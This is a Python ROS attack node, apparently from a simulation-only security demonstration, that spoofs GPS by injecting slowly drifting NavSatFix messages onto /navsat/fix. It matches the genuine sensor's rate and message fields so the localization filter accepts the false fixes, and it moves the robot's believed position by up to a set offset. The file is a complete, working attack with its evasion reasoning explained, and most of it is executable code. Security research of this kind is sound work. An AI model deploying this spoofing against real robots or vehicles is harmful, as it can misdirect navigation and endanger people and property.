#!/usr/bin/env python3
"""GPS "slow-drift" spoof against the map-frame localization pipeline.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

TIER-2 CONTAINER-SIDE BLIND INJECTOR
------------------------------------
This is the attacker node. It runs INSIDE the attacker container (see
attacker/README.md and the "Security demo -- Tier 2 network attacker" section of
CLAUDE.md) as a rogue peer that has discovered and reached the ROS master. It is
deliberately BLIND: it does NOT subscribe to or read ANY internal
robot_localization topic (no /odometry/filtered_map, no /odometry/gps, no
ground truth of any kind). A real outside attacker cannot see the defender's
internal fused estimate; this node models exactly that constraint.

It performs a single one-way action: it takes ONE seed sample of the genuine
/navsat/fix, then publishes a drifting /navsat/fix at ~2 Hz whose MAP-frame
metre offset grows OPEN-LOOP purely by elapsed time. The fused-vs-anchor
telemetry that used to live here has moved to the SEPARATE host-side defender
tool monitor_navsat_drift.py -- that is the analyst observing effects, not the
attacker. This node produces no CSV and reads nothing internal.

The container inherits ROS_MASTER_URI / ROS_IP from its entrypoint; this script
hardcodes NO host addresses.

WHAT IT DOES TO THE PIPELINE
----------------------------
This node poisons the robot's ABSOLUTE POSITION estimate by injecting subtly
falsified sensor_msgs/NavSatFix messages onto /navsat/fix. Unlike a crude flood
(which this robot rejects -- see "WHY A DRIFT, NOT A FLOOD" below), it does so
at a rate MATCHED to the genuine GPS and with a SLOWLY GROWING position offset,
so navsat_transform_node and the map EKF both treat every fake fix as an
ordinary, plausible measurement -- a gradual lie the filter trusts rather than a
sudden jump it discards.

TARGET PIPELINE (all verified live in prior sessions)
-----------------------------------------------------
    /navsat/fix (sensor_msgs/NavSatFix, ~2 Hz, published by /gazebo)
        -> navsat_transform_node
            -> /odometry/gps          (absolute map x,y)
                -> map EKF (ekf_localization_map, odom1)
                    -> map->odom TF
                        -> move_base

GPS is the SOLE absolute x/y source on this robot: wheel odometry is
velocity-only and the IMU/compass is heading-only (both confirmed live). So
corrupting /navsat/fix is the ONLY way to walk the fused, GPS-anchored map
position -- which is exactly the estimate move_base plans against.

WHY A DRIFT, NOT A FLOOD (this is the whole point)
--------------------------------------------------
Two crude approaches were tried live and FAILED on this robot:

  * Publishing fake /navsat/fix at 10 Hz or 100 Hz FLOODS navsat_transform_node.
    Overrun, it emits (0,0) on /odometry/gps -- a broken / no-transform output --
    and the map EKF REJECTS that implausible anchor. The robot never derails:
    flooding BREAKS the pipeline instead of poisoning it.

  * The fix implemented here: inject at a rate CLOSE TO the genuine ~2 Hz
    (default 2.0 Hz, configurable via --rate) so navsat_transform processes our
    fixes NORMALLY, AND apply a SLOWLY GROWING offset (a gentle ramp) that stays
    within GPS plausibility each step, so navsat_transform converts it and the
    EKF ACCEPTS it as a believable small correction. At t=0 the fake fix ~=
    truth (undetectable); it then walks away at --drift-rate metres/second up to
    a --max-offset cap.

EXACT REAL MESSAGE SHAPE (matched so navsat_transform accepts our fixes)
-----------------------------------------------------------------------
Verified live against the genuine stream:

    frame_id                 : "gps_link"
    status.status            : 0  (STATUS_FIX)
    status.service           : 0
    latitude                 : ~49.9000
    longitude                : ~8.9000
    altitude                 : ~3.12
    position_covariance      : all zeros
    position_covariance_type : 2  (COVARIANCE_TYPE_DIAGONAL_KNOWN)

navsat_transform params (live): frequency 30, delay 0.0, wait_for_datum true,
datum [49.9, 8.9, 0.0], zero_altitude true, yaw_offset +pi/2,
magnetic_declination 0. We stamp every fabricated fix with the shape above so it
is indistinguishable in structure from the genuine sensor's output.

DRIFT DIRECTION AND METRE->LAT/LON CONVERSION
---------------------------------------------
The attacker specifies drift in METRES (intuitive) in the MAP frame, either as a
bearing + growth rate (--drift-bearing / --drift-rate) or as explicit
per-second components (--drift-x / --drift-y). We convert the accumulated metre
offset to a (lat, lon) delta using the SAME WGS84 geodesy the driver and the
operator use (see the constants block below; provenance in drive_to_point_gps.py
and operator/operate.py), inverting the map<->latlon relation used everywhere
else in this project:

    map_x = (lat - REF_LAT) / DEG_LAT_PER_METRE   =>  dlat = dmap_x * DEG_LAT_PER_METRE
    map_y = -(lon - REF_LON) / DEG_LON_PER_METRE  =>  dlon = -dmap_y * DEG_LON_PER_METRE

(world +x is NORTH, world +y is WEST -- hence the minus on the longitude term.)
That (dlat, dlon) is ADDED onto a genuine reference fix, so we ride on top of
truth rather than replacing the datum.

FEEDBACK-LOOP DISAMBIGUATION -- WHY SEED-ONCE, NOT ONGOING SUBSCRIBE
-------------------------------------------------------------------
We publish to /navsat/fix; anything subscribing to /navsat/fix therefore also
sees our own fabricated messages. NavSatFix has NO child_frame / sentinel field
(unlike nav_msgs/Odometry, where attack_odom.py uses child_frame_id), so we
cannot tag our own messages structurally.

CHOSEN APPROACH -- seed the real fix ONCE at startup, before we publish:
we take a single genuine sample via rospy.wait_for_message("/navsat/fix", ...)
BEFORE starting the publish loop, cache it as the immutable reference anchor, and
then ramp the metre offset off that seed using ELAPSED TIME. No ongoing
real-fix subscription feeds the ramp, so there is no loop to contaminate. This is
robust (one clean, uncontaminated truth anchor) and honest about the mechanism:
the robot is stationary at the datum at spawn, and the attack's job is to
override where the pipeline BELIEVES the robot is, so anchoring to the genuine
fix at t=0 and walking away from it is precisely the threat model.

Trade-off noted: because the anchor is fixed at startup, if the robot were
ALREADY moving under genuine GPS when the attack starts, our fake fix would stop
tracking the real motion and the injected offset would (correctly) read as the
gap between our lie and truth -- which is the point. Documented rather than
silently assumed.

NO GROUND TRUTH / NO INTERNAL READS (hard project rule; see CLAUDE.md)
---------------------------------------------------------------------
This node NEVER reads Gazebo ground truth and, being a blind Tier-2 attacker,
NEVER reads any internal robot_localization topic. The proof-of-effect telemetry
is produced separately by the defender's host-side monitor_navsat_drift.py.

CLEAN SHUTDOWN
--------------
On Ctrl-C or --duration expiry we simply STOP publishing. We do NOT emit a
corrective message: the genuine /gazebo GPS keeps publishing, and once our
stream ceases the real fixes resume driving navsat_transform. (Mirrors
attack_odom.py.)

USAGE (container-side, via attacker/attack.sh)
----------------------------------------------
    # from the host, in the attacker/ dir with ROS_IP/ROS_MASTER_URI exported:
    docker compose run --rm attacker ./attacker/attack.sh navsat \
        --drift-rate 0.5 --max-offset 15 --duration 40

    # drift north-east explicitly, faster, capped at 25 m, for 120 s:
    docker compose run --rm attacker ./attacker/attack.sh navsat \
        --drift-x 0.4 --drift-y -0.4 --max-offset 25 --duration 120

This script was NOT run live end-to-end here. Topic/type/param wiring was
verified against the shapes and navsat_transform params documented above.
"""

import argparse
import math
import threading
import time

import rospy
from sensor_msgs.msg import NavSatFix


# ---------------------------------------------------------------------------
# The genuine fix's exact structural fields (verified live). We stamp OUR
# fabricated fixes with these so navsat_transform_node cannot tell them apart
# structurally from the real sensor's output.
# ---------------------------------------------------------------------------
REAL_FRAME_ID = "gps_link"
REAL_STATUS = NavSatFix().status.STATUS_FIX        # 0
REAL_SERVICE = 0
REAL_COVARIANCE_TYPE = NavSatFix().COVARIANCE_TYPE_DIAGONAL_KNOWN  # 2
REAL_ALTITUDE = 3.12  # metres; navsat_transform has zero_altitude=true so this
                      # is ignored downstream, but we match it for fidelity.


# ---------------------------------------------------------------------------
# MAP <-> geodetic conversion.
#
# REPLICATED VERBATIM from the driver / operator (drive_to_point_gps.py,
# operator/operate.py). Same WGS84 constants, same provenance: the GPS plugin's
# datum in gps.urdf.xacro (referenceLatitude 49.9, referenceLongitude 8.9,
# referenceHeading 0). We NEVER measure the simulator to obtain these.
# ---------------------------------------------------------------------------
REF_LAT = 49.9  # deg, <referenceLatitude>  in gps.urdf.xacro
REF_LON = 8.9   # deg, <referenceLongitude> in gps.urdf.xacro

EQUATORIAL_RADIUS = 6378137.0
FLATTENING = 1.0 / 298.257223563
E2 = 2.0 * FLATTENING - FLATTENING ** 2

_SIN2_REF_LAT = math.sin(math.radians(REF_LAT)) ** 2
RADIUS_NORTH = EQUATORIAL_RADIUS * (1.0 - E2) / (1.0 - E2 * _SIN2_REF_LAT) ** 1.5
RADIUS_EAST = (EQUATORIAL_RADIUS / math.sqrt(1.0 - E2 * _SIN2_REF_LAT)
               * math.cos(math.radians(REF_LAT)))

DEG_LAT_PER_METRE = math.degrees(1.0 / RADIUS_NORTH)
DEG_LON_PER_METRE = math.degrees(1.0 / RADIUS_EAST)


def map_offset_to_latlon_delta(dmap_x, dmap_y):
    """Invert the project's map<->latlon relation to turn a MAP-frame metre
    offset into a (dlat, dlon) delta to ADD onto a genuine fix.

        map_x = (lat - REF_LAT) / DEG_LAT_PER_METRE   -> dlat =  dmap_x * DEG_LAT_PER_METRE
        map_y = -(lon - REF_LON) / DEG_LON_PER_METRE  -> dlon = -dmap_y * DEG_LON_PER_METRE

    world +x is NORTH, world +y is WEST (hence the minus on longitude)."""
    dlat = dmap_x * DEG_LAT_PER_METRE
    dlon = -dmap_y * DEG_LON_PER_METRE
    return dlat, dlon


class NavSatDriftAttack(object):
    def __init__(self, args):
        self.args = args
        self._seed_lat = None       # immutable genuine reference fix (see below)
        self._seed_lon = None
        self._stop = threading.Event()
        self._start_wall = None

        # Unit MAP-frame drift direction (dx, dy) and the per-second growth rate.
        # Resolved once from args in run() so the ramp is a simple scalar * unit.
        self._unit_dx = 0.0
        self._unit_dy = 0.0
        self._drift_rate = 0.0  # metres/second along the unit direction

        # Publisher onto the SAME topic the genuine GPS uses. queue_size=1:
        # always the freshest fake fix, never a backlog. This is the ONLY topic
        # this node touches -- no internal-topic subscriptions (blind attacker).
        self._pub = rospy.Publisher("/navsat/fix", NavSatFix, queue_size=1)

    # --- drift geometry ------------------------------------------------------
    def _resolve_direction(self):
        """Fix the unit MAP-frame drift direction and per-second growth rate
        from args. --drift-x/--drift-y (metres/sec components) take precedence
        when either is given; otherwise --drift-bearing + --drift-rate is used.
        Bearing is degrees measured from world +x (NORTH) toward +y (WEST)."""
        if self.args.drift_x is not None or self.args.drift_y is not None:
            vx = self.args.drift_x or 0.0
            vy = self.args.drift_y or 0.0
            speed = math.hypot(vx, vy)
            if speed <= 0.0:
                raise ValueError(
                    "--drift-x/--drift-y give a zero velocity; nothing to inject")
            self._unit_dx = vx / speed
            self._unit_dy = vy / speed
            self._drift_rate = speed
        else:
            theta = math.radians(self.args.drift_bearing)
            self._unit_dx = math.cos(theta)
            self._unit_dy = math.sin(theta)
            self._drift_rate = self.args.drift_rate

    def _offset_metres(self, elapsed):
        """Ramp magnitude at time `elapsed`, capped at --max-offset.
        offset(t) = min(max_offset, drift_rate * t)."""
        return min(self.args.max_offset, self._drift_rate * elapsed)

    # --- the fabricated fix --------------------------------------------------
    def _build_fix(self, elapsed):
        """Build one fake NavSatFix: the genuine seed fix plus the current
        ramped MAP-frame offset, converted to a (lat, lon) delta. Structural
        fields (frame, status, covariance) are copied from the real shape so
        navsat_transform treats it as an ordinary measurement."""
        offset = self._offset_metres(elapsed)
        dmap_x = offset * self._unit_dx
        dmap_y = offset * self._unit_dy
        dlat, dlon = map_offset_to_latlon_delta(dmap_x, dmap_y)

        msg = NavSatFix()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = REAL_FRAME_ID
        msg.status.status = REAL_STATUS
        msg.status.service = REAL_SERVICE
        # Ride on top of truth: seed (captured once at startup) + ramped delta.
        msg.latitude = self._seed_lat + dlat
        msg.longitude = self._seed_lon + dlon
        msg.altitude = REAL_ALTITUDE
        # position_covariance defaults to all-zeros already (matches real).
        msg.position_covariance_type = REAL_COVARIANCE_TYPE
        return msg, offset

    # --- console progress ----------------------------------------------------
    def _log_progress(self, injected_offset):
        elapsed = time.time() - self._start_wall
        rospy.loginfo("[t=%6.1fs] injecting offset=%6.2fm along map dir "
                      "(%.2f, %.2f)",
                      elapsed, injected_offset, self._unit_dx, self._unit_dy)

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._resolve_direction()

        # SEED THE REAL FIX ONCE, BEFORE we publish anything (see module
        # docstring, "FEEDBACK-LOOP DISAMBIGUATION"). This single genuine sample
        # is our immutable reference anchor; the ramp walks off it by elapsed
        # time, so no ongoing /navsat/fix subscription can contaminate the ramp.
        rospy.loginfo("Waiting for one genuine /navsat/fix to seed the anchor ...")
        seed = None
        while seed is None and not rospy.is_shutdown() and not self._stop.is_set():
            try:
                candidate = rospy.wait_for_message(
                    "/navsat/fix", NavSatFix, timeout=5.0)
            except rospy.ROSException:
                rospy.logwarn("No /navsat/fix within 5 s; still waiting ...")
                continue
            # Reject unusable seeds (NO_FIX / NaN) so we anchor to a real fix.
            if candidate.status.status < 0:
                continue
            if math.isnan(candidate.latitude) or math.isnan(candidate.longitude):
                continue
            seed = candidate
        if seed is None:
            rospy.logwarn("Shutting down before a genuine fix arrived; no attack.")
            return
        self._seed_lat = seed.latitude
        self._seed_lon = seed.longitude

        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first progress line after 1 s

        rospy.loginfo(
            "ATTACK START (GPS slow-drift): seed=(%.6f, %.6f) publishing "
            "/navsat/fix at %.1f Hz, drift %.3f m/s along map dir "
            "(%.2f, %.2f), cap %.1f m%s",
            self._seed_lat, self._seed_lon, self.args.rate, self._drift_rate,
            self._unit_dx, self._unit_dy, self.args.max_offset,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")

        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            elapsed = time.time() - self._start_wall
            msg, offset = self._build_fix(elapsed)
            self._pub.publish(msg)

            now = time.time()
            if now >= next_log:
                self._log_progress(offset)
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing. Idempotent. NO corrective message is sent -- we
        just cease and let the genuine GPS reassert itself."""
        self._stop.set()
        rospy.loginfo("ATTACK STOPPED.")


def parse_args():
    p = argparse.ArgumentParser(
        description="GPS slow-drift spoof (Tier-2 blind injector): inject "
                    "subtly-offset /navsat/fix at the genuine rate to walk the "
                    "fused map position past the EKF's plausibility gate.")
    p.add_argument("--rate", type=float, default=2.0,
                   help="publish rate in Hz (default 2.0, matched to the "
                        "genuine ~2 Hz GPS so navsat_transform is not flooded)")
    p.add_argument("--drift-rate", type=float, default=0.5,
                   help="offset growth in metres/second (default 0.5); used "
                        "with --drift-bearing (ignored if --drift-x/-y given)")
    p.add_argument("--max-offset", type=float, default=15.0,
                   help="cap on the injected offset in metres (default 15)")
    p.add_argument("--drift-bearing", type=float, default=90.0,
                   help="drift direction in degrees from map +x (NORTH) toward "
                        "+y (WEST); default 90 = sideways/west")
    p.add_argument("--drift-x", type=float, default=None,
                   help="explicit map-frame x drift in metres/sec (NORTH+); "
                        "overrides --drift-bearing/--drift-rate when set")
    p.add_argument("--drift-y", type=float, default=None,
                   help="explicit map-frame y drift in metres/sec (WEST+); "
                        "overrides --drift-bearing/--drift-rate when set")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    if args.max_offset < 0:
        p.error("--max-offset must be >= 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_navsat", anonymous=True)

    attack = NavSatDriftAttack(args)
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
